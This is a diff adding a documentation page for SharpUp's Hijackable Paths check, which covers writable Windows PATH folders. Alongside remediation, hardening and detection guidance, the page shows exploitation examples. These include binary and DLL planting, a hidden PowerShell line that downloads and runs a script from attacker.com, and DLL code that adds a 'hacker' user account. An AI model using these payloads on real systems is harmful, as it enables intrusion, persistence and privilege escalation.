@@ -1,0 +1,402 @@
+---
+title: 'Hijackable Paths'
+description: 'Modifiable folders in system PATH variable'
+icon: 'route'
+---
+
+## Overview
+
+The Hijackable Paths check identifies folders in the system PATH environment variable that have weak permissions allowing non-privileged users to write files. This creates a DLL hijacking and executable planting opportunity, as Windows searches PATH folders when loading DLLs or executing programs without full paths.
+
+<Info>
+If you can write to a folder in the system PATH, you can potentially execute code when any user runs a command that triggers a search in that PATH location.
+</Info>
+
+## How It Works
+
+SharpUp performs the following checks:
+
+1. Reads the system PATH from `HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment`
+2. Splits PATH into individual folder paths (separated by semicolons)
+3. Checks each folder for write/modify permissions for the current user
+4. Reports folders where the user has write access
+
+### Technical Details
+
+```csharp
+// Pseudocode
+string path = Registry.GetValue("HKLM\\...\\Environment", "Path");
+string[] folders = path.Split(';');
+
+foreach (string folder in folders) {
+    if (CheckModifiableAccess(folder)) {
+        // User can write to this PATH folder
+        ReportVulnerability(folder);
+    }
+}
+```
+
+## Example Output
+
+```
+=== Modifiable Folders in %PATH% ===
+    C:\CustomTools
+    C:\Scripts
+```
+
+**Interpretation:**
+- These folders are in the system PATH
+- Current user can write to them
+- Placing executables here will allow them to be run without full paths
+- Placing DLLs here may allow DLL hijacking
+
+## Exploitation
+
+### Method 1: Binary Planting
+
+```powershell
+# If C:\CustomTools is in PATH and writable
+
+# Create malicious executable with common name
+echo "malicious payload" > C:\CustomTools\whoami.exe
+
+# When any user runs "whoami" without full path:
+whoami
+# Windows searches PATH and may find your malicious version first
+```
+
+### Method 2: DLL Hijacking via PATH
+
+```powershell
+# Place malicious DLL in writable PATH folder
+Copy-Item C:\temp\malicious.dll C:\CustomTools\version.dll
+
+# When applications load version.dll without full path:
+# Windows searches PATH folders and loads your malicious DLL
+```
+
+### Method 3: Persistence
+
+```powershell
+# Add backdoor to writable PATH folder with common name
+$payload = @"
+@echo off
+REM Legitimate-looking script
+REM Hidden malicious payload
+powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
+"@
+
+$payload | Out-File -FilePath "C:\CustomTools\update.bat" -Encoding ASCII
+
+# Runs whenever someone types "update"
+```
+
+### Method 4: Service Hijacking
+
+```powershell
+# Find services that might execute PATH-based commands
+Get-WmiObject Win32_Service | Where-Object {
+    $_.PathName -notmatch "C:\\Windows" -and
+    $_.PathName -notmatch '"'
+}
+
+# If service tries to execute something without full path,
+# place malicious version in writable PATH folder
+```
+
+## Remediation
+
+<Steps>
+  <Step title="Identify Writable PATH Folders">
+    ```powershell
+    # Check system PATH
+    $systemPath = [Environment]::GetEnvironmentVariable("Path", "Machine")
+    $systemPath -split ';' | ForEach-Object {
+        $folder = $_
+        if (Test-Path $folder) {
+            $acl = Get-Acl $folder
+            Write-Host "Checking: $folder"
+
+            # Check for problematic permissions
+            $acl.Access | Where-Object {
+                $_.IdentityReference -match "Users|Everyone|Authenticated Users" -and
+                $_.FileSystemRights -match "Write|Modify|FullControl"
+            } | ForEach-Object {
+                Write-Host "  [!] Vulnerable: $($_.IdentityReference) has $($_.FileSystemRights)" -ForegroundColor Red
+            }
+        }
+    }
+    ```
+  </Step>
+
+  <Step title="Secure Folder Permissions">
+    ```powershell
+    # Fix permissions on vulnerable folder
+    $folder = "C:\CustomTools"
+
+    # Reset permissions
+    icacls $folder /inheritance:r
+
+    # Grant appropriate permissions
+    icacls $folder /grant:r "SYSTEM:(OI)(CI)F"
+    icacls $folder /grant:r "Administrators:(OI)(CI)F"
+    icacls $folder /grant:r "Users:(OI)(CI)RX"
+
+    Write-Host "[+] Secured permissions on $folder"
+    ```
+  </Step>
+
+  <Step title="Remove Unnecessary PATH Entries">
+    ```powershell
+    # Review and remove unnecessary folders from PATH
+    $systemPath = [Environment]::GetEnvironmentVariable("Path", "Machine")
+    $paths = $systemPath -split ';'
+
+    # Display current PATH
+    $paths | ForEach-Object { Write-Host $_ }
+
+    # Remove specific path (manual decision needed)
+    $newPath = $paths | Where-Object { $_ -ne "C:\CustomTools" }
+    [Environment]::SetEnvironmentVariable("Path", ($newPath -join ';'), "Machine")
+    ```
+  </Step>
+
+  <Step title="Move Folders to Protected Locations">
+    If tools are needed, move them to protected locations:
+
+    ```powershell
+    # Move tools to Program Files
+    New-Item -Path "C:\Program Files\CustomTools" -ItemType Directory
+    Copy-Item "C:\CustomTools\*" -Destination "C:\Program Files\CustomTools\" -Recurse
+
+    # Update PATH
+    $systemPath = [Environment]::GetEnvironmentVariable("Path", "Machine")
+    $newPath = $systemPath.Replace("C:\CustomTools", "C:\Program Files\CustomTools")
+    [Environment]::SetEnvironmentVariable("Path", $newPath, "Machine")
+
+    # Remove old folder
+    Remove-Item "C:\CustomTools" -Recurse -Force
+    ```
+  </Step>
+
+  <Step title="Verify Fix">
+    ```bash
+    # Re-run check
+    SharpUp.exe HijackablePaths
+    ```
+
+    Should return no vulnerable paths.
+  </Step>
+</Steps>
+
+## Detection
+
+### Defensive Monitoring
+
+```powershell
+# Monitor file creation in PATH folders
+$pathFolders = [Environment]::GetEnvironmentVariable("Path", "Machine") -split ';'
+
+foreach ($folder in $pathFolders) {
+    if (Test-Path $folder) {
+        # Enable auditing
+        $acl = Get-Acl $folder
+        $auditRule = New-Object System.Security.AccessControl.FileSystemAuditRule(
+            "Everyone",
+            "CreateFiles,AppendData",
+            "None",
+            "None",
+            "Success"
+        )
+        $acl.AddAuditRule($auditRule)
+        Set-Acl $folder $acl
+    }
+}
+
+# Monitor Event ID 4663 for file creation in PATH
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4663} |
+Where-Object {
+    $pathFolders | ForEach-Object {
+        if ($_.Message -match [regex]::Escape($_)) { return $true }
+    }
+}
+```
+
+### Detection Strategies
+
+<Tabs>
+  <Tab title="File System Monitoring">
+    - Monitor file creation/modification in PATH folders
+    - Alert on new executables or DLLs in PATH
+    - Track who creates files in PATH folders
+    - Baseline known-good files and alert on changes
+  </Tab>
+
+  <Tab title="Process Monitoring">
+    - Monitor execution of programs from writable PATH folders
+    - Alert on DLL loads from writable PATH locations
+    - Track process tree when PATH-based execution occurs
+  </Tab>
+
+  <Tab title="Permission Auditing">
+    - Regularly audit PATH folder permissions
+    - Alert on permission changes to PATH folders
+    - Monitor who accesses PATH folders
+  </Tab>
+</Tabs>
+
+## Real-World Scenarios
+
+<AccordionGroup>
+  <Accordion title="Scenario 1: Developer Tools Folder">
+    **Context:** IT team added `C:\DevTools` to system PATH for convenient access. Developers have modify rights.
+
+    **Risk:**
+    - Any developer can plant malicious executables
+    - Affects all users on the system
+    - Persistence survives reboots
+
+    **Solution:**
+    - Move to Program Files with proper permissions
+    - Use user PATH instead of system PATH
+    - Implement AppLocker to whitelist executables
+  </Accordion>
+
+  <Accordion title="Scenario 2: Legacy Application Path">
+    **Context:** Old application installer added folder to PATH with weak permissions.
+
+    **Attack Path:**
+    1. Attacker gets standard user access
+    2. Plants malicious `systeminfo.exe` in writable PATH folder
+    3. Administrator runs PowerShell script that calls `systeminfo`
+    4. Malicious version executes with administrator privileges
+  </Accordion>
+
+  <Accordion title="Scenario 3: Script Folder in PATH">
+    **Context:** `C:\Scripts` in system PATH for convenience, Users group has write access.
+
+    **Impact:**
+    - Any user can add malicious scripts
+    - Common script names can be hijacked (backup.bat, update.ps1)
+    - Automated tasks may execute malicious scripts
+    - Privilege escalation when admin runs affected scripts
+  </Accordion>
+</AccordionGroup>
+
+## Advanced Exploitation
+
+### DLL Search Order Hijacking
+
+```powershell
+# Windows DLL search order (with SafeDllSearchMode enabled):
+# 1. Directory where application loaded from
+# 2. System directory (C:\Windows\System32)
+# 3. 16-bit system directory (C:\Windows\System)
+# 4. Windows directory (C:\Windows)
+# 5. Current directory
+# 6. Directories in PATH variable
+
+# If step 6 has writable folder, you can place malicious DLLs there
+
+# Example: Create malicious version.dll
+$code = @"
+#include <windows.h>
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        // Malicious payload
+        WinExec("cmd.exe /c net user hacker P@ss /add", SW_HIDE);
+    }
+    return TRUE;
+}
+"@
+
+# Compile and place in writable PATH folder
+# When any application tries to load version.dll, your code runs
+```
+
+## Prevention Best Practices
+
+<CardGroup cols={2}>
+  <Card title="Minimize PATH Entries" icon="minimize">
+    Only include necessary folders in system PATH. Remove legacy entries.
+  </Card>
+  <Card title="Secure Permissions" icon="lock">
+    PATH folders should only be writable by Administrators and SYSTEM.
+  </Card>
+  <Card title="Use Program Files" icon="folder">
+    Place all shared tools in Program Files with default protected permissions.
+  </Card>
+  <Card title="User vs System PATH" icon="users">
+    Use user PATH for user-specific tools, not system PATH.
+  </Card>
+</CardGroup>
+
+### Hardening Script
+
+```powershell
+# Harden all PATH folders
+$systemPath = [Environment]::GetEnvironmentVariable("Path", "Machine")
+$pathFolders = $systemPath -split ';'
+
+foreach ($folder in $pathFolders) {
+    if (Test-Path $folder) {
+        Write-Host "[*] Hardening: $folder"
+
+        # Reset inheritance and set secure permissions
+        $acl = Get-Acl $folder
+
+        # Disable inheritance
+        $acl.SetAccessRuleProtection($true, $false)
+
+        # Remove all existing rules
+        $acl.Access | ForEach-Object { $acl.RemoveAccessRule($_) }
+
+        # Add secure rules
+        $systemRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
+            "SYSTEM", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow"
+        )
+        $adminRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
+            "Administrators", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow"
+        )
+        $usersRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
+            "Users", "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow"
+        )
+
+        $acl.AddAccessRule($systemRule)
+        $acl.AddAccessRule($adminRule)
+        $acl.AddAccessRule($usersRule)
+
+        Set-Acl $folder $acl
+        Write-Host "[+] Secured: $folder"
+    }
+}
+```
+
+## Related Checks
+
+<CardGroup cols={2}>
+  <Card title="Process DLL Hijack" icon="file-code" href="/ghostpack-docs/SharpUp-mdx/checks/processdllhijack">
+    Check for writable DLLs loaded by privileged processes
+  </Card>
+  <Card title="Registry Autoruns" icon="list" href="/ghostpack-docs/SharpUp-mdx/checks/registryautoruns">
+    Find modifiable autorun binaries
+  </Card>
+  <Card title="Unquoted Service Path" icon="quote-left" href="/ghostpack-docs/SharpUp-mdx/checks/unquotedservicepath">
+    Identify unquoted service paths
+  </Card>
+  <Card title="Remediation Guide" icon="shield" href="/ghostpack-docs/SharpUp-mdx/remediation">
+    Comprehensive remediation guidance
+  </Card>
+</CardGroup>
+
+## References
+
+<CardGroup cols={2}>
+  <Card title="Microsoft Docs" icon="book" href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order">
+    Dynamic-Link Library Search Order
+  </Card>
+  <Card title="MITRE ATT&CK" icon="book" href="https://attack.mitre.org/techniques/T1574/007/">
+    T1574.007 - Hijack Execution Flow: Path Interception by PATH Environment Variable
+  </Card>
+</CardGroup>
